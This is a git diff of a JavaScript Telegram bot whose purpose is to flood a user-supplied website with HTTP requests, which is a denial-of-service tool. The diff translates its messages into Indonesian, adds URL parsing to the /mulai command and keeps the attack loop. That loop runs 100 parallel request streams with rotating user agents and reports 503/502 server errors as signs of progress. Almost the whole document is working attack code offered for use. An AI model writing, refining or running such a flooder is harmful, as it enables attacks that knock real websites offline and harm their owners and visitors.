@@ -69,16 +69,16 @@ function sendReq(target, agent, userAgent, chatId) {
     };
 
     axios
-        .get(target, { httpAgent: agent, headers: headers, timeout: 0 })
+        .get(target, { httpAgent: agent, headers: headers, timeout: 5000 }) // Tambah timeout untuk stabilitas
         .then((_) => {
-            bot.sendMessage(chatId, "Request sent successfully!");
+            bot.sendMessage(chatId, "Permintaan berhasil dikirim!");
             setTimeout(() => sendReq(target, agent, userAgent, chatId), 0);
         })
         .catch((error) => {
             if (error.response && error.response.status === 503) {
-                bot.sendMessage(chatId, "Server responded with 503, continuing...");
+                bot.sendMessage(chatId, "Server merespons 503, melanjutkan...");
             } else if (error.response && error.response.status === 502) {
-                bot.sendMessage(chatId, "Error: Request failed with status code 502");
+                bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
             } else {
                 bot.sendMessage(chatId, `Error: ${error.message}`);
             }
@@ -108,70 +108,74 @@ function sendReqs(targetUrl, chatId) {
 // Telegram bot commands
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "Welcome to the bot! Use /mulai to start the attack.");
+    bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> untuk memulai serangan (contoh: /mulai https://example.com).");
 });
 
-bot.onText(/\/mulai/, (msg) => {
+bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "Please enter the target URL (e.g., https://example.com):");
+    let url = match[1].trim();
 
-    // Listen for the next message from the user
-    bot.once('message', (msg) => {
-        const url = msg.text.trim();
-        if (!url.startsWith("http://") && !url.startsWith("https://")) {
-            bot.sendMessage(chatId, "Invalid URL. Please enter a valid URL (e.g., https://example.com).");
-            return;
+    // Tambahkan protokol jika tidak ada
+    if (!url.startsWith("http://") && !url.startsWith("https://")) {
+        url = `https://${url}`;
+    }
+
+    // Validasi URL
+    try {
+        new URL(url);
+    } catch (error) {
+        bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com");
+        return;
+    }
+
+    bot.sendMessage(chatId, "🚀 Memulai serangan... 🤣");
+    let continueAttack = true;
+    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas realistis
+    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas kecepatan
+
+    const attack = () => {
+        try {
+            if (!continueAttack) return;
+
+            const userAgent = randElement(userAgents);
+            const headers = {
+                'User-Agent': userAgent
+            };
+
+            axios.get(url, { headers })
+                .then((response) => {
+                    if (response.status === 503) {
+                        bot.sendMessage(chatId, "Server merespons 503, melanjutkan...");
+                    }
+                })
+                .catch((error) => {
+                    if (error.response && error.response.status === 502) {
+                        bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
+                    }
+                });
+
+            setTimeout(attack, 1000 / requestsPerSecond);
+        } catch (error) {
+            bot.sendMessage(chatId, `Error: ${error.message}`);
+            setTimeout(attack, 1000 / requestsPerSecond);
         }
+    };
 
-        bot.sendMessage(chatId, "🚀 Starting attack... 🤣");
-        let continueAttack = true;
-        const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Adjust as needed
-        const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Adjust as needed
+    const numThreads = 100; // Kurangi untuk stabilitas
+    for (let i = 0; i < numThreads; i++) {
+        attack();
+    }
 
-        const attack = () => {
-            try {
-                if (!continueAttack) return;
-
-                const userAgent = randElement(userAgents);
-                const headers = {
-                    'User-Agent': userAgent
-                };
-
-                axios.get(url, { headers })
-                    .then((response) => {
-                        if (response.status === 503) {
-                            bot.sendMessage(chatId, "Server responded with 503, continuing...");
-                        }
-                    })
-                    .catch((error) => {
-                        if (error.response && error.response.status === 502) {
-                            bot.sendMessage(chatId, "Error: Request failed with status code 502");
-                        }
-                    });
-
-                setTimeout(attack, 1000 / requestsPerSecond);
-            } catch (error) {
-                bot.sendMessage(chatId, `Error: ${error.message}`);
-                setTimeout(attack, 1000 / requestsPerSecond);
-            }
-        };
-
-        const numThreads = 100; // Reduced for testing; adjust as needed
-        for (let i = 0; i < numThreads; i++) {
-            attack();
-        }
-
-        setTimeout(() => {
-            continueAttack = false;
-            bot.sendMessage(chatId, "Max requests reached. Attack stopped.");
-        }, maxRequests / requestsPerSecond * 1000);
-    });
+    setTimeout(() => {
+        continueAttack = false;
+        bot.sendMessage(chatId, "Batas maksimum permintaan tercapai. Serangan dihentikan.");
+    }, maxRequests / requestsPerSecond * 1000);
 });
 
 // Display startup message
 console.log('\033[38;5;46m' +
 `            
-[Your ASCII art here]
+[ASCII art disingkat untuk kejelasan]
 ` + '\033[38;5;196m───────────────────────────────────────────\n' +
 '\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m VERSION  \033[38;5;196m : \033[38;5;46m2.2\n' +
 '\033[38;5;196m[\033[38;5;46m+\033[38;5;196m]\033[38;5;46m AUTHOR   \033[38;5;196m : \033[38;5;46m{> Rizky blackhead <}\n' +
@@ -179,4 +183,4 @@ console.log('\033[38;5;46m' +
 '\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Government Websites\n' +
 '\033[38;5;196m[\033[38;5;46m!]\033[38;5;196m DONT ATTACK: Education Websites\n───────────────────────────────────────────\x1b[0m');
 
-console.log("Telegram bot is running...");
+console.log("Bot Telegram sedang berjalan...");
